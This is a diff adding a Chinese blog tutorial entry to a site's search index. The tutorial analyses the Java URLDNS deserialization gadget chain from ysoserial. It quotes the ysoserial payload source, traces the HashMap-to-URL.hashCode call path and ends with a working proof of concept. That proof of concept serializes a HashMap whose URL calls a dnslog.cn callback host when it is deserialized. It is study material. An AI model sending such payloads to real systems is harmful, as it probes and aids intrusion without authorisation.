@@ -1891,4 +1891,198 @@
         <tag>python</tag>
       </tags>
   </entry>
+  <entry>
+    <title>关于URLDNS利用链的学习</title>
+    <url>/2023/07/15/URLDNS/</url>
+    <content><![CDATA[<h2 id="JAVA-URLDNS利用链分析"><a href="#JAVA-URLDNS利用链分析" class="headerlink" title="JAVA URLDNS利用链分析"></a>JAVA URLDNS利用链分析</h2><h3 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h3><p>URLDNS是ysoserial项目中的一条利用链，这条利用链主要用来做验证反序列化漏洞是否存在。</p>
+<p>URLDNS利用链有以下特点：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、利用链只能发起DNS请求，不能进行其他的利用</span><br><span class="line">2、不限制JDK版本，使用java内置类，对第三方依赖没有要求</span><br><span class="line">3、没有回显，所以可以通过DNS请求来验证反序列化漏洞是否存在</span><br></pre></td></tr></table></figure></div>
+
+<p>利用URLDNS链验证反序列化漏洞存在的原理：</p>
+<p>java.until.hashmap类实现了serializable接口，重写了read0bject方法,再反序列化时会调用hash函数计算key的hashcode，</p>
+<p>java.net.URL的hashcode再计算时会调用<code>getHostAddress</code>来解析域名, 从而发出<code>DNS</code>请求。</p>
+<p>那如何利用这个特点去验证是否存在反序列化漏洞？</p>
+<p>我们可以构造一个恶意的序列华对象，序列化对象中包含一个恶意的URL地址，当目标将序列化对象进行反序列化时，会调用hash函数计算key的hashcode，然后java.net.URL的hashcode再计算时会调用<code>getHostAddress</code>来解析域名，解析之后回想我们定义的url地址发送请求，从而我们可以验证是否存在反序列化请求。</p>
+<h3 id="二、URLDNS利用链分析"><a href="#二、URLDNS利用链分析" class="headerlink" title="二、URLDNS利用链分析"></a>二、URLDNS利用链分析</h3><p>在上面我们简单介绍了以下URLDNS链的作用和工作原理，下面我们通过ysoserial项目来相信分析以下利用链的实现过程。</p>
+<p>项目地址：<a class="link"   href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial" >https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>我们先看一下URLDNS.java代码：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">            <span class="comment">//在创建有效负载时避免DNS解析</span></span><br><span class="line">            <span class="comment">//由于字段&lt;code&gt;java.net.URL.handler&lt;/code&gt;是暂态的，因此它不会成为序列化负载的一部分。</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421173838312.png"
+                      alt="image-20230421173838312"
+                ></p>
+<p>可以看到在这里实例化了一个Hashmap类</p>
+<p>我们先了解以下hashmap类：</p>
+<p>hashmap是一种常用的集合类，它实现了map接口，可以储存键值对。hashmap使用哈希表来实现，提供了快速的插入，删除和查找工作。</p>
+<p>下面是hashmap常用的一些方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">put(key, value)：将指定的键值对存储到HashMap中，如果key已经存在，则会用新的value覆盖旧的value，返回值为旧的                  value或null。</span><br><span class="line">get(key)：返回指定键所映射的值，如果该键不存在，则返回null。</span><br><span class="line">remove(key)：从HashMap中移除指定的键值对，如果该键不存在，则不进行任何操作，返回值为被移除的value或null。</span><br><span class="line">size()：返回HashMap中键值对的数量。</span><br><span class="line">clear()：移除HashMap中的所有键值对。</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>然后上面说实例化了一个HashMap类，这里因为Hashmap类重写了read0bject()方法。</p>
+<p>跟进hashmap类的read0bject()方法（这里只给出主要部分）</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    ******</span><br><span class="line">        ******  </span><br><span class="line">        s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    ******</span><br><span class="line">        ******</span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到这里有一个循环，先分析一下这个循环：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">@SuppressWarnings(&quot;unchecked&quot;)是Java中的一个注解，用于告诉编译器忽略在代码中出现的类型转换警告。在Java中，有些类型转换可能会导致运行时异常，例如ClassCastException，因此编译器会在代码中出现类型转换时发出警告。</span><br><span class="line"></span><br><span class="line">K key = (K) s.readObject();</span><br><span class="line"> 是HashMap类中的一个方法，用于从ObjectInputStream对象中读取一个键对象，并将其转换为泛型类型K。也就是进行反序列化后转换类型。</span><br><span class="line"> </span><br><span class="line">V value = (V) s.readObject();</span><br><span class="line"> 是HashMap类中的一个方法，用于从ObjectInputStream对象中读取一个值对象，并将其转换为泛型类型V</span><br><span class="line"> </span><br><span class="line">putVal(hash(key), key, value, false, false);</span><br><span class="line">  是HashMap类中的一个方法，用于将指定的键值对添加到HashMap中。</span><br><span class="line">首先，代码调用hash(key)方法计算出键的哈希值，以确定该键值对在HashMap中的位置。hash(key)方法是HashMap的一个私有方法，用于计算指定键的哈希值。</span><br><span class="line">接下来，代码调用putVal()方法将键值对添加到HashMap中。putVal()方法是HashMap的一个私有方法，用于将指定的键值对添加到HashMap中。它的参数包括哈希值、键、值、两个布尔值，用于指定是否需要覆盖已有的键值对以及是否需要扩容HashMap。</span><br></pre></td></tr></table></figure></div>
+
+<p>其实整体来看就是通过遍历读取序列化后的键和值并将其反序列化后重新组成键值对</p>
+<p>继续跟进hash(key)方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">     int h;</span><br><span class="line">     return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这里key!&#x3D;null就会执行h &#x3D; key.hashCode()</p>
+<p>到这里我们就可以找那些可以序列化的类中有hashcode方法（从触发点倒着分析这条利用链可能更好分析一点）。</p>
+<p>重新回到urldns.java类分析</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421201715818.png"
+                      alt="image-20230421201715818"
+                ></p>
+<p>可以看到首先实例化了一个URLStreamHandler类，然后又实例化了hashmap和URL类</p>
+<p>然后是ht.put(u,url)向名为 <code>ht</code> 的 <code>Hashtable</code> 对象中添加一个新的键值对，其中 <code>u</code> 是键，<code>url</code> 是值。</p>
+<p>跟进一下put方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421203006633.png"
+                      alt="image-20230421203006633"
+                ></p>
+<p>可以看到这里调用了purval函数作为返回值</p>
+<p>这里的key就是我们上面的url对，然后这里的key是作为hash()方法的参数，那我们继续跟进hash()方法：		</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421203213447.png"
+                      alt="image-20230421203213447"
+                ></p>
+<p>跟进到hash方法后我们可以看到当key值就是我们的url对象不为null的时候会调用hashcode方法，这里的key就是url类的实例化对象。</p>
+<p>在hash方法中，会调用key的hashCode方法，也就是说，通过创建一个HashMap对象，对该对象的key传入其他任意对象，再对HashMap实例进行序列化，再将其进行反序列化时，就会触发执行任意对象hashCode方法。</p>
+<p>跟入查看URL类的hashcode()方法:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421203504776.png"
+                      alt="image-20230421203504776"
+                ></p>
+<p>可以看到hashcode!&#x3D;-1会调用 handler的 <code>hashCode()</code> 方法</p>
+<p>然后这里handler是<code>URLStreamHandler</code>的实例对象。</p>
+<p>跟进一些<code>URLStreamHandler</code>的hashcode方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421205125569.png"
+                      alt="image-20230421205125569"
+                ></p>
+<p>可以看到hashcode方法中调用了getHostAddress,传入的是url对象</p>
+<p>然后返回url对象调用getHostAddress方法。</p>
+<p>继续跟进getHostAddress方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421205444974.png"
+                      alt="image-20230421205444974"
+                ></p>
+<p>继续跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230421205600360.png"
+                      alt="image-20230421205600360"
+                ></p>
+<p>这里就是我们这条利用链的最终触发点了，</p>
+<p><code>InetAddress.getByName()</code> 是Java中的一个方法，它将主机名或IP地址字符串作为参数，并返回一个表示其网络地址的 <code>InetAddress</code> 对象。如果参数是主机名，<code>getByName()</code> 方法将查询DNS以查找该主机名的IP地址。如果参数是IP地址字符串，则该方法将返回一个表示该IP地址的 <code>InetAddress</code> 对象。该方法可能会抛出 <code>UnknownHostException</code> 异常，如果主机名无法解析或IP地址无效，则会抛出该异常。</p>
+<p>这里根据主机名获取ip地址会进行一次DNS查询</p>
+<p>这里进行一个小demo吧：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package ysoserial.test2;</span><br><span class="line"></span><br><span class="line">import java.net.InetAddress;</span><br><span class="line">import java.net.UnknownHostException;</span><br><span class="line"></span><br><span class="line">public class getHostAddressTest &#123;</span><br><span class="line">    public static void main(String[] args) throws UnknownHostException &#123;</span><br><span class="line">        String host =&quot;baidu.com&quot;;</span><br><span class="line">        InetAddress hostAddess = InetAddress.getByName(host);</span><br><span class="line">        System.out.println(hostAddess.getHostAddress());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>测试结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230422182109428.png"
+                      alt="image-20230422182109428"
+                ></p>
+<p>可以看到对域名进行了一次解析，那么我们就可以通过这里来验证是否存在反序列化漏洞。</p>
+<p>那么经过上面的分析，我们可以得到一个利用链：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap-&gt;readObject</span><br><span class="line">HashMap-&gt;hash</span><br><span class="line">URL-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;hashCode</span><br><span class="line">URLStreamHandler-&gt;getHostAddress</span><br><span class="line">URL-&gt;getHostAddress</span><br><span class="line">    -&gt; InetAddress.getByName(host)</span><br></pre></td></tr></table></figure></div>
+
+<p>整体来说就是：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            URL.hashCode()</span><br></pre></td></tr></table></figure></div>
+
+<p>经过上面的分析我们对urldns利用链有了一定的了解，但是大家这里就会有一个疑问，既然最终调用的是url类里面的hashcode，为什么还要从hashmap类入手呢？</p>
+<p>这是因为在url类里面的readobject里面并没有调用hashcode，所以我们想要使用这条链就要找到一个在反序列化过程中调用了hashcode的类，而使用hashcode方法最多的自然是hashmap结构，而我们进入hashmap类的源码可以看到，其readObject方法在最后调用了hash方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203107013.png"
+                      alt="image-20230714203107013"
+                ></p>
+<p>跟进hash方法：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203153750.png"
+                      alt="image-20230714203153750"
+                ></p>
+<p>可以看到这里调用了url类的hashcode方法，这也是我们为什么要从hashmap类入手的原因</p>
+<p>上面我们从正面分析了从hashmap到url类的hashcode是如何触发dns解析</p>
+<p>回到hashmap的readobject方法：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">        K key = (K) s.readObject();</span><br><span class="line">    @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">        V value = (V) s.readObject();</span><br><span class="line">    putVal(hash(key), key, value, false, false);</span><br></pre></td></tr></table></figure></div>
+
+<p>key 是从<code>K key = (K) s.readObject();</code> 这段代码，也是就是readObject中得到的，说明之前在writeObject会写入key</p>
+<p>进入到hashmapwriteObject</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230715085510298.png"
+                      alt="image-20230715085510298"
+                ></p>
+<p>可以看到这里最后调用了internalWriteEntries方法</p>
+<p>跟进：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230715085612835.png"
+                      alt="image-20230715085612835"
+                ></p>
+<p>可以看到这里的key和value都是从tables中获取的，而table的值就是hashmap中的table的值</p>
+<p>那我们想要修改table的值就需要调用hashmap中的put方法</p>
+<p>但是hashmap中的put方法也会对key调用一次hash方法，所以在这里会产生第一次dns查询</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">        return putVal(hash(key), key, value, false, true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>为了避免这一次的dns查询，ysoserial 中使用<code>SilentURLStreamHandler</code> 方法，直接返回null，并不会像<code>URLStreamHandler</code>那样去调用一系列方法最终到<code>getByName</code>，因此也就不会触发dns查询了</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230715085934670.png"
+                      alt="image-20230715085934670"
+                ></p>
+<p>或者在生成paylaod的时候将hashcode的值设为除-1外其他的.</p>
+<p>通过上面的分析我们自己来写一条pop链：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class UrlDns &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        URL url = new URL(&quot;http://s0y1rl.dnslog.cn/&quot;);</span><br><span class="line">       Field hashCode = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);//通过反射获取到hashcode</span><br><span class="line">        hashCode.setAccessible(true);//绕过java语言权限控制检查权限</span><br><span class="line">        hashCode.set(url, 0);//设置hashcode的值为其他数字</span><br><span class="line">        hashMap.put(url, null);//调用hashmap对象中的put方法，此时hashcode不为-1不触发dns查询</span><br><span class="line">        hashCode.set(url, -1);//将hashcode重新赋值为-1</span><br><span class="line">        try &#123;</span><br><span class="line">            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">            outputStream.writeObject(hashMap);</span><br><span class="line">            outputStream.close();</span><br><span class="line">            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p>这里通过dnslog来进行测试</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203318902.png"
+                      alt="image-20230714203318902"
+                ></p>
+<p>运行代码后：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230714203413133.png"
+                      alt="image-20230714203413133"
+                ></p>
+]]></content>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
 </search>
